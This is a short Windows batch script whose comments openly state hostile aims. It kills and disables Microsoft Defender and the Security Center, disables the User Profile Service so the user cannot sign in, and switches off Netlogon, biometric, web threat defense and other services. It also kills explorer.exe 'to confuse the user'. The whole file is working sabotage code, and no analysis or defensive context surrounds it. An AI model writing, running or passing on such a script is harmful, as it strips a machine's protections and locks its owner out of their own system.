@echo off


REM Try to disable MS Defender
taskkill /f /im MsMpEng.exe
sc config "WinDefend" start= disabled
sc config "wscsvc" start= disabled


REM Disable the User Profile Service so the user cant sign in
sc config "User Profile Service" start= disabled

REM disable services
sc config "mppsvc" start= disabled
sc config "Netlogon" start= disabled
sc config "WbioSrvc" start= disabled
sc config "webthreatdefsvc" start= disabled
sc config "webthreatdefusersvc" start= disabled
sc config "WEPHOSTSVC" start= disabled
sc config "wlidsvc" start= disabled
sc config "WMansvc" start= disabled
sc config "wlpasvc" start= disabled
  
REM kill EXPLORER to confuse the user
taskkill /f /im explorer.exe
